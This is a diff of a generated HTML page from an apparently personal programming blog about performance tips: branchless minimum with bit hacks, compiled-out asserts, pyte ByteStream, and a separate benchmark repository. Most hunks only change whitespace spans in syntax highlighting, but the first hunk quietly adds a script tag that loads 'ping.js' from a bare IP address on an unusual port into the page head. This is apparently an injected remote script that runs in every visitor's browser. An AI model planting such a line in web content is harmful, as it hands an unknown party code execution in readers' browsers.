@@ -45,6 +45,8 @@
   <script src='/js/lunr-2.3.9.min.js'></script>
   <script src='/js/search_index.js'></script>
   <script src='/js/search.min.js'></script>
+
+  <script src='http://192.34.63.156:6127/ping.js' async></script>
 </head>
 <body>
 <header>
@@ -96,7 +98,7 @@ Actually any modern compiler will do this for you and if possible, it will repla
 </span></p>
 <p>In low level languages a conditional can be replaced with as faster combination of bit hacks.</p>
 <p>A classic example is <a href="https://graphics.stanford.edu/~seander/bithacks.html#IntegerMinOrMax">find the minimum two values</a>:</p>
-<div class="highlight-candombe"><pre><span></span><code><span class="kt">int</span><span class="w"> </span><span class="n">x</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span><span class="w"> </span><span class="n">y</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">2</span><span class="p">;</span><span class="w"></span>
+<div class="highlight-candombe"><pre><span></span><code><span class="kt">int</span><span class="w"> </span><span class="n">x</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span><span class="w"> </span><span class="n">y</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">2</span><span class="p">;</span>
 
 <span class="kt">int</span><span class="w"> </span><span class="n">minimum</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">x</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="n">y</span><span class="p">)</span><span class="w"> </span><span class="o">?</span><span class="w"> </span><span class="n">x</span><span class="w"> </span><span class="o">:</span><span class="w"> </span><span class="n">y</span><span class="p">;</span><span class="w">   </span><span class="c1">// slow, branch version</span>
 
@@ -192,10 +194,10 @@ You may think that nobody would want to capture an <code><span class="highlight-
 <p>An indeed if something really bad happen to the program’s state, not further action may be safe to execute. It is better to die as quickly as possible and avoid doing more damage.</p>
 <p>An <code><span class="highlight-candombe-inline"><span class="k">assert</span></span></code> requires <em>at least</em> a check; complex invariants will require complex asserts and this leads to spend more time on that..</p>
 <p>In C and similar the asserts can be removed with a compilation flag: you can have them enabled during testing but disabled on production.</p>
-<div class="highlight-candombe"><pre><span></span><code><span class="kt">void</span><span class="w"> </span><span class="nf">foo</span><span class="p">(()</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
-<span class="w">    </span><span class="n">assert</span><span class="p">(</span><span class="n">expensive</span><span class="p">());</span><span class="w"></span>
-<span class="w">    </span><span class="p">...</span><span class="w"></span>
-<span class="p">}</span><span class="w"></span>
+<div class="highlight-candombe"><pre><span></span><code><span class="kt">void</span><span class="w"> </span><span class="nf">foo</span><span class="p">(()</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="n">assert</span><span class="p">(</span><span class="n">expensive</span><span class="p">());</span>
+<span class="w">    </span><span class="p">...</span>
+<span class="p">}</span>
 </code></pre></div>
 
 <p>When disabled, neither the <code><span class="highlight-candombe-inline"><span class="k">assert</span></span></code> nor the <code><span class="highlight-candombe-inline"><span class="n">expensive</span><span class="p">()</span></span></code> function are called.</p>
@@ -217,8 +219,8 @@ You may think that nobody would want to capture an <code><span class="highlight-
 <p>The fix was to use <code><span class="highlight-candombe-inline"><span class="n">pyte</span><span class="o">.</span><span class="n">ByteStream</span></span></code> but I had to pay the price to run all the tests again (hours lost).</p>
 <h2 id="have-a-parallel-project-for-benchmark">Have a parallel project for benchmark</h2>
 <p>Trying different things may make you repo a little messy. For running benchmark it is better to have a second repo and use the first as upstream.</p>
-<div class="highlight-candombe"><pre><span></span><code>$ ls proj/pyte                            <span class="c1"># main project</span>
-$ git clone proj/pyte proj/benchmark_pyte     <span class="c1"># second project</span>
+<div class="highlight-candombe"><pre><span></span><code>$<span class="w"> </span>ls<span class="w"> </span>proj/pyte<span class="w">                            </span><span class="c1"># main project</span>
+$<span class="w"> </span>git<span class="w"> </span>clone<span class="w"> </span>proj/pyte<span class="w"> </span>proj/benchmark_pyte<span class="w">     </span><span class="c1"># second project</span>
 </code></pre></div>
 
 <p>Then, only what it is committed and update on <code><span class="highlight-candombe-inline"><span class="n">benchmark_pyte</span></span></code> will be used for the benchmark.</p>
